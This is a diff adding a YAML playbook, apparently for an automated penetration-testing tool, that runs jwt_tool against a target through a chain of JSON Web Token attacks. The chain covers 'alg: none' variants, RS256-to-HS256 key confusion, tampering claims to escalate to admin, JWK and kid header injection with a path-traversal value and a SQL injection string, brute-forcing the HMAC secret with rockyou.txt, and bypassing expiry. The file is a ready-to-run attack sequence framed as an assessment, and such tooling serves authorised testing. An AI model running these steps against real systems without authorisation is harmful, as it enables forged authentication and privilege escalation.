@@ -1,0 +1,211 @@
+name: "JWT Attacks"
+description: "JWT security assessment: alg confusion, kid injection, weak signing key, token tampering, and null signature attacks"
+version: "1.0"
+
+vars:
+  jwt_token: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "JWT security assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Token capture and decode ----
+  - id: capture
+    name: "Token capture and decode"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: jwt_capture
+        name: "Capture token from target"
+        tool: curl
+        args: ["-sI", "{target}", "-o", "{case_dir}/jwt-capture.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/jwt-capture.txt"]
+
+      - id: jwt_decode
+        name: "Decode JWT parts"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-M", "pb", "-o", "{case_dir}/jwt-decoded.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/jwt-decoded.txt"]
+
+      - id: jwt_scan
+        name: "Scan token for vulnerabilities"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-M", "at", "-o", "{case_dir}/jwt-scan.txt"]
+        timeout: 60
+
+  # ---- Phase 2: Algorithm attacks ----
+  - id: alg_attacks
+    name: "JWT algorithm confusion attacks"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: alg_none
+        name: "alg: none attack"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "a", "-I", "-hc", "alg", "-hv", "none",
+               "-o", "{case_dir}/jwt-alg-none.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/jwt-alg-none.txt"]
+
+      - id: alg_none_key
+        name: "alg: None (uppercase) attack"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "a", "-I", "-hc", "alg", "-hv", "None",
+               "-o", "{case_dir}/jwt-alg-None.txt"]
+        timeout: 30
+
+      - id: alg_none_null
+        name: "alg: nOnE (mixed case) attack"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "a", "-I", "-hc", "alg", "-hv", "nOnE",
+               "-o", "{case_dir}/jwt-alg-none-mixed.txt"]
+        timeout: 30
+
+      - id: alg_hs256
+        name: "RS256 → HS256 confusion"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "s", "-I", "-hc", "alg", "-hv", "HS256",
+               "-pk", "public.pem",
+               "-o", "{case_dir}/jwt-hs256.txt"]
+        timeout: 60
+
+      - id: alg_hs384
+        name: "RS384 → HS384 confusion"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "s", "-I", "-hc", "alg", "-hv", "HS384",
+               "-pk", "public.pem",
+               "-o", "{case_dir}/jwt-hs384.txt"]
+        timeout: 60
+
+  # ---- Phase 3: Payload tampering ----
+  - id: payload_attacks
+    name: "JWT payload tampering"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: tamper_user
+        name: "Tamper — escalate to admin"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "role", "-pv", "admin",
+               "-o", "{case_dir}/jwt-tamper-admin.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/jwt-tamper-admin.txt"]
+
+      - id: tamper_sub
+        name: "Tamper — change subject"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "sub", "-pv", "admin",
+               "-o", "{case_dir}/jwt-tamper-sub.txt"]
+        timeout: 30
+
+      - id: tamper_iat
+        name: "Tamper — iat/exp bypass"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "iat", "-pv", "0",
+               "-o", "{case_dir}/jwt-tamper-iat.txt"]
+        timeout: 30
+
+      - id: tamper_extra
+        name: "Inject custom claims"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "is_admin", "-pv", "true",
+               "-o", "{case_dir}/jwt-tamper-extra.txt"]
+        timeout: 30
+
+  # ---- Phase 4: Key attacks ----
+  - id: key_attacks
+    name: "JWK header injection and key attacks"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: jwk_inject
+        name: "JWK header injection"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "j", "-o", "{case_dir}/jwt-jwk-inject.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/jwt-jwk-inject.txt"]
+
+      - id: kid_inject
+        name: "kid header injection (path traversal)"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "k", "-I", "-hc", "kid", "-hv", "/dev/null",
+               "-o", "{case_dir}/jwt-kid-inject.txt"]
+        timeout: 60
+
+      - id: kid_sqli
+        name: "kid SQL injection"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "k", "-I", "-hc", "kid", "-hv", "' UNION SELECT 1 --",
+               "-o", "{case_dir}/jwt-kid-sqli.txt"]
+        timeout: 60
+
+  # ---- Phase 5: Weak key cracking ----
+  - id: crack
+    name: "Weak signing key brute-force"
+    type: conditional
+    condition:
+      any:
+        - contains: "HS256"
+          ref: jwt_scan
+        - contains: "HS384"
+          ref: jwt_scan
+        - contains: "HS512"
+          ref: jwt_scan
+    then:
+      - id: jwt_crack
+        name: "Crack HMAC secret"
+        tool: jwt_tool
+        args: ["-C", "-d", "/wordlists/rockyou.txt",
+               "-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-o", "{case_dir}/jwt-cracked.txt"]
+        timeout: 600
+        artifacts: ["{case_dir}/jwt-cracked.txt"]
+
+  # ---- Phase 6: NotBefore and timing attacks ----
+  - id: timing
+    name: "JWT timing and nbf bypass"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: nbf_bypass
+        name: "NotBefore (nbf) bypass"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "nbf", "-pv", "0",
+               "-o", "{case_dir}/jwt-nbf.txt"]
+        timeout: 30
+
+      - id: exp_bypass
+        name: "Expiration bypass"
+        tool: jwt_tool
+        args: ["-t", "{target}", "-rh", "Authorization: Bearer {jwt_token}",
+               "-X", "i", "-I", "-pc", "exp", "-pv", "9999999999",
+               "-o", "{case_dir}/jwt-exp.txt"]
+        timeout: 30
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "JWT assessment note"
+    type: log
+    message: |
+      JWT assessment complete for {target}.
+      Results in {case_dir}/jwt-*.txt. Check for successful tamper responses,
+      alg none bypass, JWK/kid injections, and weak key cracks.
